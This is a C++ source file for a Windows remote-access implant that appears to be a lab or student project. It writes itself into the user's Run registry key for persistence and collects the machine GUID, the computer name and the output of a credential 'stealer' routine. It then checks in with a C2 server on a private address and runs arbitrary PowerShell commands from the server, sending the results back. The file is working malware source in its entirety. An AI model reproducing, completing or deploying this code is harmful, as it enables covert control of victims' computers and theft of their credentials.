#include <cstdlib>
#include <fstream>
#include <iostream>
#include <filesystem>
#include <cstdint>
#include "httpClient.h"
#include "rsa.h"
#include "base64.h"
#include "stealer.h"

#define INFO_BUFFER_SIZE 32767

LONG getGUID(char* res, DWORD* size);
LONG persistenceLOL(void);
void convertFileToString(string* str);

/* List of basic powershell commands: https://devblogs.microsoft.com/scripting/table-of-basic-powershell-commands/ */
int wmain()
{
    bool check = true;
    //std::filesystem::exists("C:\\malware\\ch0nky.txt");
    if(check){
        persistenceLOL();
        //FreeConsole();
        //get machine guid
        char value[255];
        DWORD BufferSize = sizeof(value);
        if(getGUID(value, &BufferSize)){
            printf("Can't get machine guid\n");
        }

        //get computer name
        char infoBuf[INFO_BUFFER_SIZE];
        DWORD bufCharCount = INFO_BUFFER_SIZE;
        GetComputerNameA((LPSTR)infoBuf, &bufCharCount);

        std::string checkin("{\"guido\": \"");
        std::string guid(value, BufferSize-1);
        size_t range = 200000; // 100000 + range is the maximum value you allow
        size_t number = 100000 + (rand() * range) / RAND_MAX;
        std::string sleepTimer = std::to_string(number);
        std::string mName(infoBuf, bufCharCount);
        checkin = checkin + guid + "\", \"sleepTime\": " + sleepTimer + ", \"computerName\": \"" + mName + "\", \"agentId\": \"1337\"}";
        string stealaStr = steala();


        // if successful, connect to the server
        HTTP *client = new HTTP();
        int port = 5000, tls = 0;
        client->connectToServer(L"10.0.2.15", port);
        if(!client->checkConnection()){
            wprintf(L"Error, couldn't connect to server\n");
            return 1;
        }

        /* MEGA FAIL LOL
        // Checkin with the c2
        std::wstring RSA_key = L"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCpB9NABjMA/DT8W9cto6E48ak7zlPaG5l7K2SMqkzmS/VcGzx9aCduTpkKfJK6Fld9jOHCm2m8U+aTMIuB7eh0qJMrg/BU68r38BgpK7bmaZTrqgGEaBuutfAFkUkkNre9PEgutYjnrFquuvU/PnrKVMfRUhv5RF5rZVq9q2A3H9f2VVOnMD/J8871gEHX1khWtHwolrTPO4Uj4gJsoc3Dh45adKiqkBdR75E3U/ypGcWXre7tPdweVWXGCAYsxHwSj9PX2Yuuacb3i84AyP4+juqk09VFyv+3XNLbgW4dFgxrIBDtYuoVcuSVOfycFJYY/ve5zprullMDG9sHf/wIDAQAB";
        printf("%d\n", RSA_key.size());
        DWORD key_size;
        decode(RSA_key, NULL, &key_size);
        BYTE *bRSA_key = new BYTE[key_size];
        decode(RSA_key, bRSA_key, &key_size);

        RSA *rsa = new RSA(bRSA_key, key_size);
        char test[] = "HEllo world";
        rsa->Encrypt((BYTE*)test, 11);
        printf("ciphertext: %s\n ciphertext size: %d\n", rsa->ciphertext, rsa->ptBufferSize);
        */

        client->additionalHeader = L"User-Agent: IWasBornInTheUSA";
        client->header_size = 28;
        client->requestData = checkin.c_str();
        client->data_size = checkin.size();
        DWORD result = 0;
        client->makeHttpRequest(L"POST", L"/checkIn", tls, &result);
        if(result){
            printf("Failed to connect to c2, oops\n");
        }

        bool iamImmortal = true;
        string taskStr, strTemp, taskHolder, powershellCommand, output, finalOutput;
        size_t semiColonIndex, numOfTasks, start_index;
        while(iamImmortal){
            Sleep(10000);
            //request jobs
            taskStr = client->makeHttpRequest(L"POST", L"/jobs", tls, &result);
            cout << "Tasks: " << taskStr.c_str() << endl;
            if(result && taskStr.size()){
                printf("Unable to get tasks\n");
            }else{
                //parse the tasks
                strTemp = taskStr.substr(0, taskStr.size()-2);
                cout << strTemp.c_str() << endl;
                semiColonIndex = 0;
                numOfTasks = 0;
                start_index = 2;
                semiColonIndex = strTemp.find(";", semiColonIndex);
                finalOutput = "";

                //do the tasks
                while(semiColonIndex != -1){
                    taskHolder = strTemp.substr(start_index, semiColonIndex-start_index);
                    if(!taskHolder.compare("steal")){
                        finalOutput += "----------" + taskHolder + "----------\n";
                        finalOutput += stealaStr;
                    }else if(!taskHolder.compare("kill")){
                        iamImmortal = false;
                    }else{
                        powershellCommand = "powershell " + taskHolder + " >C:\\Users\\User\\test.txt";
                        finalOutput += "----------" + taskHolder + "----------\n";
                        std::system(powershellCommand.c_str());
                        convertFileToString(&finalOutput);
                    }
                    finalOutput += "\n\n";
                    start_index = semiColonIndex + 2;
                    semiColonIndex = strTemp.find(";", semiColonIndex + 1);
                    numOfTasks++;
                }
                if(numOfTasks != 0){
                    cout << finalOutput.c_str() << endl;
                    client->requestData = finalOutput.c_str();
                    client->data_size = finalOutput.size();
                    client->makeHttpRequest(L"POST", L"/reply", tls, &result);
                    if(result){
                        printf("Failed to send back response, oops\n");
                    }
                }
            }
        }

        delete client;
        return 0;
    }else{
        printf("ch0nk not found");
        return 1;
    }
}

void convertFileToString(string* str){
    std::ifstream temp_file("C:\\Users\\User\\test.txt");
    std::string first_impression((std::istreambuf_iterator<char>(temp_file)), std::istreambuf_iterator<char>());
    *str += first_impression;
    std::remove("C:\\Users\\User\\test.txt");
}

// https://stackoverflow.com/questions/48432994/c-read-machine-guid-via-reggetvalue
LONG getGUID(char* res, DWORD* size){
    HKEY mykey = NULL;
    auto result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &mykey);
    //LONG result = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", RRF_RT_REG_SZ, NULL, res, size);
    if (result == 0){
        RegQueryValueExA(mykey, "MachineGuid", NULL, NULL, (LPBYTE)res, size);
        RegCloseKey(mykey);
    }
    else{
        std::cerr << "Error: " << res << std::endl;
        return 1;
    }
    return 0;
}

LONG persistenceLOL(){
    HKEY mykey = NULL;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &mykey);
    char filePath[100];
    DWORD size = GetModuleFileNameA(NULL, (LPSTR)filePath, (DWORD)100);
    const char* czStartName = "trolllolol";
    std::string temp(filePath, size);
    std::string path("\"");
    path += temp + "\"";
    res = RegSetValueExA(mykey, (LPCSTR)czStartName, 0, REG_SZ, (unsigned char*)path.c_str(), size + 3);
    RegCloseKey(mykey);
    return res;
}